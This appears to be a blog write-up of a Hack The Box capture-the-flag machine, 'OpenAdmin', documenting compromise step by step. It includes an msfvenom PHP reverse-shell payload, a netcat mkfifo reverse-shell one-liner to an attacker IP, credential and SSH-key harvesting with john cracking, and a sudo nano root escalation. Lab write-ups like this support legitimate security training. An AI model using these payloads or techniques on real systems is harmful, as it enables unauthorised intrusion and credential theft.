---
layout: post
title: "HTB: OpenAdmin"
tags: htb oscp-like crackstation gtfobins
---
### Recce
22,80


`http://openadmin.htb/artwork/`
nothing much


`http://openadmin.htb/ona/`
v18.1.1


### Open up google and search 'ona 18.1.1 exploit'
first result:
```
https://www.exploit-db.com/exploits/47691
```
exploit works; tried: nc -nv 10.10.14.2 4444 while listening on 4444 and got a callback.


### Uploaded meterpreter shell
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f raw > shell.php
```

### PHP-fied the shell (notice the msfvenom output was 'raw'):
```
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

### Via shell, copied the shell.php to /images so i get:
`http://openadmin.htb/ona/images/shell.php`


### `cat database_settings.inc.php`
```php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

?>
```

### `mysql -u ona_sys -p`
Enter password: n1nj4W4rri0R!

```
use ona_default;
show tables;
```

### Tables in ona_default:
```
blocks
configuration_types
configurations
custom_attribute_types
custom_attributes
dcm_module_list
device_types
devices
dhcp_failover_groups
dhcp_option_entries
dhcp_options
dhcp_pools
dhcp_server_subnets
dns
dns_server_domains
dns_views
domains
group_assignments
groups
host_roles
hosts
interface_clusters
interfaces
locations
manufacturers
messages
models
ona_logs
permission_assignments
permissions
roles
sequences
sessions
subnet_types
subnets
sys_config
tags
users
vlan_campuses
vlans
```

### Users in ona_default:
```
id      username        password        level   ctime   atime
1       guest   098f6bcd4621d373cade4e832627b4f6        0       2020-03-30 10:59:53     2020-03-30 10:59:53
2       admin   21232f297a57a5a743894a0e4a801fc3        0       2007-10-30 03:00:17     2007-12-02 22:10:26
```
Password is ‘admin’ … ._.


### `show databases;`
```
information_schema
ona_default
```


### `ps ax -w -o pid,user,cmd --no-header`
didn't know what i was doing there


searching deep into /opt/ona/ to no avail (as of writing)


### `cd home`
```
ls -al
total 16
drwxr-xr-x  4 root   root   4096 Nov 22 18:00 .
drwxr-xr-x 24 root   root   4096 Nov 21 13:41 ..
drwxr-x---  5 jimmy  jimmy  4096 Nov 22 23:15 jimmy
drwxr-x---  6 joanna joanna 4096 Nov 28 09:37 joanna
```

### interesting (but no cigar):
```
./www/enum.out:623:-rwxr-xr-x  1 root root  10K Sep 30 15:23 systemd-reply-password
./www/enum.out:720:-rw-r--r-- 1 root root  724 Sep 30 15:23 systemd-ask-password-console.service
./www/enum.out:721:-rw-r--r-- 1 root root  752 Sep 30 15:23 systemd-ask-password-wall.service
./www/enum.out:844:-rw-r--r-- 1 root root  490 Apr  4  2019 systemd-ask-password-plymouth.path
./www/enum.out:845:-rw-r--r-- 1 root root  467 Apr  4  2019 systemd-ask-password-plymouth.service
./www/enum.out:927:-rw-r--r-- 1 root root  704 Jan 28  2018 systemd-ask-password-console.path
./www/enum.out:928:-rw-r--r-- 1 root root  632 Jan 28  2018 systemd-ask-password-wall.path
./www/enum.out:983:lrwxrwxrwx 1 root root 36 Sep 30 15:23 systemd-ask-password-console.path -> ../systemd-ask-password-console.path
./www/enum.out:1015:lrwxrwxrwx 1 root root 33 Sep 30 15:23 systemd-ask-password-wall.path -> ../systemd-ask-password-wall.path
```


useful:
```
https://stackoverflow.com/questions/16956810/how-do-i-find-all-files-containing-specific-text-on-linux
```


fuckin’ hell… with just a hint from hackthebox forums, tried the sql creds for jimmy’s ssh login and succeeded.
```
Lytes
January 6 edited January 6 Report Spoiler
I got the www-data level shell but I cant seem to find anything interesting, any help would go a long way. Kindly PM. Thanks.
P.S: I found my**l credentials but cant figure out how to use em with RCE
EDIT: Nevermind, found who the my**l creds belong too ^_^
```


### `ssh jimmy@openadmin.htb` / n1nj4W4rri0R!


### `/etc/apache2/sites-enabled$ id`
```
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
```


### `/etc/apache2/sites-enabled$ cat internal.conf`
```html
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```


### `etc/apache2/sites-enabled$ netstat -ant | grep LISTEN`
```
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN 
```


### `/var/www/internal$ cat index.php`
```php
if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1')
```


### https://crackstation.net/ :
```
00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1
sha512
Revealed
```


### `/var/www/internal$ cat main.php`
```php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```


### `/var/www/internal$ curl -u jimmy:n1nj4W4rri0R! 127.0.0.1:52846/main.php`
```
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```


### changed the shell_exec command in /main.php to: 
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 5555 >/tmp/f`


### `curl -u jimmy:n1nj4W4rri0R! 127.0.0.1:52846/main.php` 
with a netcat to catch joanna shell


so… had to crack joanna’s ssh key actually [when see a ‘passphrase’ for SSH private key, know that this can be cracked with john]
`python /usr/share/john/ssh2john.py joanna.key > joanna.key.hashes`


### `sudo john --format=SSH joanna.key.hashes`
bloodninjas


### `joanna@openadmin:~$ sudo -l`
```
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```


### `https://gtfobins.github.io/gtfobins/nano/#sudo`
```
sudo nano /opt/priv
```
hit ctrl+R

hit ctrl+X
```
reset; sh 1>&0 2>&0
```

### rooted
